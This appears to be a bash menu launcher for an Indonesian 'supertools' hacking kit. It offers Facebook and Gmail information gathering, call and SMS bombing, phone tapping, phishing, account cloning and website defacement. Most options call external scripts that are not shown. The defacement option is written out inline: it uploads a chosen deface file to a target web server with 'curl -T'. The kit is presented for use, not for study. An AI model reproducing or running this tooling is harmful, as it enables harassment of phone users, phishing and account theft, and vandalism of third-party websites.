#!/bin/bash
#supertools
#special for you
#author : Mr. PsK3R (BEJOH)
#team : Begundal-Njoho
#github : https://github.com/Anang80
#color
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
w='\033[37;1m'
y='\033[33;1m'

banner(){
		echo $b"──∆∆─"$y"------______-------"
		echo $b"─_─¢=─∆∆──"$y"----____-----"
		echo $b"─√✓π°─"$y"______──____─__"
		echo $b"─✓✓✓✓──"$y"^°=°°==^°°°¢"
		echo $b"─▒─▒─▒─▒───"$y"✓✓✓✓✓" $c"© Begundal-Njoho"
		echo""
		echo $c"╭━╮╭━╮"$y"╱╱"$c"╭╮╭╮"$y"╱╱"$c"╭━━━━╮"$y"╱╱╱╱"$c"╭╮"
		echo $c"┃┃╰╯┃┃"$y"╱╱"$c"┃┣╯╰╮"$y"╱"$c"┃╭╮╭╮┃"$y"╱╱╱╱"$c"┃┃"
		echo $c"┃╭╮╭╮┣╮╭┫┣╮╭╋╮╰╯┃┃┣┻━┳━━┫┃╭━━╮"
		echo $c"┃┃┃┃┃┃┃┃┃┃┃┃┣┫"$y"╱╱"$c"┃┃┃╭╮┃╭╮┃┃┃━━┫"
		echo $c"┃┃┃┃┃┃╰╯┃╰┫╰┫┃"$y"╱╱"$c"┃┃┃╰╯┃╰╯┃╰╋━━┃"
		echo $c"╰╯╰╯╰┻━━┻━┻━┻╯"$y"╱╱"$c"╰╯╰━━┻━━┻━┻━━╯" $y"v.2.0"
		echo""
		sleep 1
		echo $g"================================================="
		sleep 1
		echo $y"	••••• "$c"special for you "$y"•••••"
		sleep 1
		echo $g"================================================="
		echo""
}

main(){
		sleep 1
		echo $r"	["$y"#"$r"]"$w" silahkan dipilih bosqu" $r"["$y"#"$r"]"
		sleep 1
		echo""
		echo $r"["$y"1"$r"]"$w" Facebook (information gathering)" $y"	["$g"✓"$y"]"$g"connect"
		echo $r"["$y"2"$r"]"$w" gmail (information gathering)" $y"	["$g"✓"$y"]"$g"connect"
		echo $r"["$y"3"$r"]"$w" nik checker" $y"			["$g"✓"$y"]"$g"connect"
		echo $r"["$y"4"$r"]"$w" bom call" $y"				["$g"✓"$y"]"$g"connect"
		echo $r"["$y"5"$r"]"$w" bom sms" $y"				["$g"✓"$y"]"$g"connect"
		echo $r"["$y"6"$r"]"$w" phoneploits (sadap hp)" $y"		["$g"✓"$y"]"$g"connect"
		echo $r"["$y"7"$r"]"$w" cek nomor (information gathering)" $y"	["$g"✓"$y"]"$g"connect"
		echo $r"["$y"8"$r"]"$w" web site (penetration testing)" $y"	["$g"✓"$y"]"$g"connect"
		echo $r"["$y"9"$r"]"$w" socialphis (all phissing)" $y"		["$g"✓"$y"]"$g"connect"
		echo $r"["$y"10"$r"]"$w" deface webdav" $y"			["$g"✓"$y"]"$g"connect"
		echo $r"["$y"11"$r"]"$w" Instagram tools" $y"			["$g"✓"$y"]"$g"connect"
		echo $r"["$y"99"$r"]" $w"™exit..." $y"				["$r"?"$y"]"$c"exit"
		echo""
		echo $r"["$y"#"$r"]"$w" masukan pilihan №"$c
		read -p "input : " no
		if [ $no = "1" ]; then
			clear
			banner
			sleep 1
			echo $r"	["$y"#"$r"]"$w" silahkan pilih option" $r"["$y"#"$r"]"
			sleep 1
			echo""
			echo $r"["$y"1"$r"]"$w" Facebook tools" $y"	["$g"✓"$y"]"$g"connect"
			echo $r"["$y"2"$r"]"$w" yahoocloning" $y"	["$g"✓"$y"]"$g"connect"
			echo $r"["$y"99"$r"]" $w"™exit..." $y"		["$r"?"$y"]"$c"exit"
			echo""
			echo $c"================================================="
			echo""
			echo $r"["$y"#"$r"]"$w" masukkan pilihan №"$c
			read -p "input : " pill
			if [ $pill = "1" ]; then
				clear
				cd file
				pip2 install mechanize
				python2 fb.py
			elif [ $pill = "2" ]; then
				clear
				banner
				cd file
				python2 cl.py
			elif [ $pill = "99" ]; then
				echo $r"["$y"#"$r"]" $w"terimakasih atas dukungan kalian semua"
				echo $r"["$y"#"$r"]" $w"tetap dukung chanell "$g"Anang 80 "$w"supaya terus berkembang ya"
				exit
			else
				echo $r"["$y"#"$r"]" $w"kesalahan parse.."
				exit
			fi
		elif [ $no = "2" ]; then
			clear
			pip install colorama
			pip install -r requirements.txt
			clear
			banner
			cd mail
			sh mail.sh
		elif [ $no = "3" ]; then
			clear
			banner
			cd file
			sh nik.sh
		elif [ $no = "4" ]; then
			clear
			banner
			cd file
			php call.php
		elif [ $no = "5" ]; then
			clear
			banner
			cd file
			php sms.php
		elif [ $no = "6" ]; then
			clear
			banner
			cd file
			sh phn.sh
		elif [ $no = "7" ]; then
			clear
			banner
			cd file
			python2 pg.py
		elif [ $no = "8" ]; then
			clear
			cd web
			pip install -r requirements.txt
			clear
			sh web.sh
		elif [ $no = "9" ]; then
			clear
			banner
			cd phiss
			bash ps.sh
		elif [ $no = "10" ]; then
			clear
			banner
			echo $r"["$y"#"$r"]" $w"masukkan web target"
			read -p "input : " target
			echo $r"["$y"#"$r"]" $w "masukkan script deface"
			read -p "input :" sc
			curl -T /storage/emulated/0/$sc $target
			echo $r"["$y"#"$r"]" $w"cek web :" $target"/"$sc
		elif [ $no = "11" ]; then
			clear
			cd file
			bash ig.sh
		elif [ $no = "99" ]; then
			echo $r"["$y"#"$r"]" $w"terimakasih atas dukungan kalian semua"
			echo $r"["$y"#"$r"]" $w"tetap dukung chanell "$g"Anang 80 "$w"supaya terus berkembang ya"
			exit
		else
			echo $r"["$y"#"$r"]" $w"kesalahan parse.."
			exit
		fi
}

note(){
		echo $r"	["$y"#"$r"]" $w"THANKS FOR SUPPORT" $r"["$y"#"$r"]"
		sleep 2
		echo""
		echo $r"["$y"#"$r"]" $w"terimakasih atas dukungan kalian semua"
		sleep 2
		echo $r"["$y"#"$r"]" $w"yang telah mendukung dan suport chanell kami"
		sleep 2
		echo $r"["$y"#"$r"]" $w"terus bantu chanell kami yaa bosqu, "
		sleep 2
		echo $r"["$y"#"$r"]" $w"supaya tetap terus memberi tutorial yang bermanfaat"
		sleep 2
		echo $r"["$y"#"$r"]" $w"yang belum subscribe, silahkan subscribe, like, komen dan share"
		sleep 2
}
clear
banner
note
#bisa hubungi wa=+18313184579
clear
banner
main